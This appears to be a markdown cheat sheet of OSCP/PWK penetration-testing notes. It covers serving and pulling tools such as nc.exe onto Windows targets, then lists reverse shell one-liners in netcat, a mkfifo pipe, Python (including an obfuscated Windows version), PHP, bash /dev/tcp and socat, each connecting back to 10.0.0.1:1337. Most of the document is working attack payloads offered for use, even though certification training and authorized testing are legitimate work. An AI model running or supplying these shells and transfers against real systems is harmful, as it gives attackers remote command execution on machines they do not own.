# OSCP-PWK-Notes

---

## Useful services

### SSHd

```bash
sudo systemctl start ssh

sudo systemctl stop ssh
```

Add this line to `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` if you are dealing with old versions of `ssh`.
```
KexAlgorithms diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

### Apache2

```bash

sudo systemctl start apache2

sudo systemctl stop apache2
```

Default root directory is `/var/www/html`.

---

## File Transfers

### HTTP
```bash
On Linux:
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
sudo updog -p 80

curl http://10.0.0.1:80/nc.exe > nc.exe
wget http://10.0.0.1:80/nc.exe -O nc.exe

On Windows:
certutil -f -split -urlcache http://10.0.0.1:80/nc.exe nc.exe
(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.1:80/nc.exe", "C:\nc.exe")  
Invoke-WebRequest "http://10.0.0.1:80/nc.exe" -OutFile "C:\nc.exe"  
```

### SMB

```bash
On Linux:
sudo smbserver.py -port 445 -smb2support share . 

On Windows:
copy \\10.0.0.1\share\nc.exe C:\nc.exe
\\10.0.0.1\share\whoami.exe
```

### FTP

```bash
On Linux:
sudo python3 -m pyftpdlib -p 21 -w

On Windows:
ftp 10.0.0.1
ftp> binary
ftp> passive
```

### TFTP

```bash
On Linux:
sudo atftpd --daemon --port 69 /tftp
```

```bash
On Windows
tftp -i 10.0.0.1 GET nc.exe
```

### nc

Linux &rarr; Windows
```bash
On Linux:
cat nc.exe | nc -lvnp 1337

On Windows
nc 10.0.0.1 1337 > nc.exe
```

Windows &rarr; Linux
```bash
On Linux:
nc 10.0.0.1 1337 < nc.exe

On Windows
nc -lvnp 1337 > nc.exe
```

---

## Reverse Shell

### Listener
```bash
rlwrap nc -lvnp 1337
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Netcat/nc Traditional

```
nc -e /bin/sh 10.0.0.1 1337
nc -e /bin/bash 10.0.0.1 1337
nc -c /bin/bash 10.0.0.1 1337
```

### Netcat/nc OpenBSD

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1337 >/tmp/f
```

### Python

Linux:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Windows:
```
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 1337)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",1337);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.0.0.1",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Bash TCP

```
bash -i >& /dev/tcp/10.0.0.1/1337 0>&1
```

### Socat

Attacker:
```bash
socat file:`tty`,raw,echo=0 TCP-L:1337
```

Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:1337
```

---

## Powershell version

```powershell
64-bit: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
32-bit: C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 
```

To check 32-bit/64-bit:
```powershell
[Environment]::Is64BitProcess
```
---

## Static Binaries

https://github.com/ernw/static-toolbox

https://github.com/ZephrFish/static-tools

https://github.com/andrew-d/static-binaries

https://github.com/interference-security/kali-windows-binaries


## References

https://github.com/tbowman01/OSCP-PWK-Notes-Public

https://github.com/swisskyrepo/PayloadsAllTheThings
